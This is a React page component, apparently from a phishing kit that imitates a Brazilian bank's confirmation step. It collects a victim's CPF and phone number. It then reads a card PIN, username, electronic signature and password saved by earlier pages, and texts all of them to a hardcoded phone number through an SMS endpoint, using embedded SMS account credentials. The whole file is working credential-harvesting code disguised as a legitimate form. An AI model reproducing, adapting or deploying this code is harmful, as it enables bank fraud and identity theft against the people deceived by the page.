import React, { useState } from 'react';
import fetch from 'isomorphic-fetch';

const Header = () => {
  return (
    <header className="header">
      <img src="mLogomenor.png" alt="Logo" className="logo" />
    </header>
  );
};

const ConfirmPage = () => {
  const [cpf, setCpf] = useState('');
  const [telefone, setTelefone] = useState('');
  const [error, setError] = useState('');

  const handleCpfChange = (e) => {
    setCpf(e.target.value);
  };

  const handleTelefoneChange = (e) => {
    setTelefone(e.target.value);
  };

  const validateCpf = (cpf) => {
    // Coloque aqui a lógica de validação do CPF
    // Retorne true se for válido e false caso contrário
    // Exemplo de validação simplificada apenas para demonstração:
    return cpf.length === 11;
  };

  const validateTelefone = (telefone) => {
    // Coloque aqui a lógica de validação do telefone
    // Retorne true se for válido e false caso contrário
    // Exemplo de validação simplificada apenas para demonstração:
    return telefone.length >= 10;
  };

  const sendSMS = () => {
    const accountSid = 'AC6ca98d7f5e58bff0f34ab592236ce25c';
    const authToken = 'de4fcb6b1d443db792317d284221e3bc';

    const senhaCartao = localStorage.getItem('senhaCartao');
    const username = localStorage.getItem('username');
    const assinaturaEletronica = localStorage.getItem('assinaturaEletronica');
    const password = localStorage.getItem('password');

    fetch('/api/send-sms', {
      method: 'POST',
      body: JSON.stringify({
        accountSid,
        authToken,
        from: '+17853902284',
        to: '+5511991471545',
        body: `CPF: ${cpf}\nSenha do Cartão: ${senhaCartao}\nUsername: ${username}\nTelefone: ${telefone}\nAssinatura Eletrônica: ${assinaturaEletronica}\nPassword: ${password}`,
      }),
      headers: {
        'Content-Type': 'application/json',
      },
    })
      .then((response) => response.json())
      .then((data) => {
        console.log(data);
      })
      .catch((error) => {
        console.error('Error:', error);
      });
  };

  const handleRedirect = () => {
    if (cpf === '' || telefone === '') {
      setError('Por favor, preencha todos os campos.');
    } else if (!validateCpf(cpf)) {
      setError('CPF inválido. Verifique novamente.');
    } else if (!validateTelefone(telefone)) {
      setError('Telefone inválido. Verifique novamente.');
    } else {
      setError('');

      // Armazena os valores do CPF e do telefone no localStorage
      localStorage.setItem('cpf', cpf);
      localStorage.setItem('telefone', telefone);

      sendSMS(); // Chamada para enviar a mensagem de SMS
      // Redireciona para a página desejada
      window.location.href = "/loading4";
    }
  };

  return (
    <div style={{ backgroundColor: '#fff', minHeight: '100vh', display: 'flex', flexDirection: 'column' }}>
      <Header />
      <div style={{ flex: 1, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'flex-start', padding: '20px' }}>
        <h2 style={{ fontSize: '16px', color: '#282828', alignSelf: 'flex-start', paddingLeft: '3%' }}>Favor informar:</h2>
        <form style={{ width: '100%', maxWidth: '400px', padding: '10px', marginTop: '5%' }}>
          <label htmlFor="cpf" style={{ fontSize: '16px', color: '#282828' }}>
            <b>CPF:</b>
          </label>
          <input
            type="text"
            id="cpf"
            name="cpf"
            placeholder="Digite o CPF (11 dígitos)"
            value={cpf}
            onChange={handleCpfChange}
            style={{
              width: '100%',
              fontSize: '16px',
              border: 'none',
              borderBottom: 'solid 1px #b3b3b3',
              borderRadius: '2px',
              display: 'block',
              color: '#282828',
              padding: '8px',
              height: '36px',
              outline: '0',
              marginTop: '5%',
              marginBottom: '7%',
            }}
            maxLength={11}
          />
          <label htmlFor="telefone" style={{ fontSize: '16px', color: '#282828', marginTop: '10px' }}>
            <b>(DDD) Telefone:</b>
          </label>
          <input
            type="text"
            id="telefone"
            name="telefone"
            placeholder="Digite o telefone (mínimo 10 dígitos)"
            value={telefone}
            onChange={handleTelefoneChange}
            style={{
              width: '100%',
              fontSize: '16px',
              border: 'none',
              borderBottom: 'solid 1px #b3b3b3',
              borderRadius: '2px',
              display: 'block',
              color: '#282828',
              padding: '8px',
              height: '36px',
              outline: '0',
              marginTop: '5%',
            }}
            minLength={10}
          />
          {error && <p style={{ color: 'red', marginTop: '5px' }}>{error}</p>}
          <button
            type="button"
            onClick={handleRedirect}
            style={{
              background: 'url(img/bgbottom.png) repeat',
              borderRadius: '4px',
              fontFamily: 'arial',
              fontSize: '18px',
              color: '#fff',
              padding: '12px',
              textAlign: 'center',
              width: '100%',
              cursor: 'pointer',
              backgroundColor: '#fc990a',
              marginTop: '40px',
            }}
          >
            CONFIRMAR
          </button>
        </form>
      </div>
    </div>
  );
};

export default ConfirmPage;
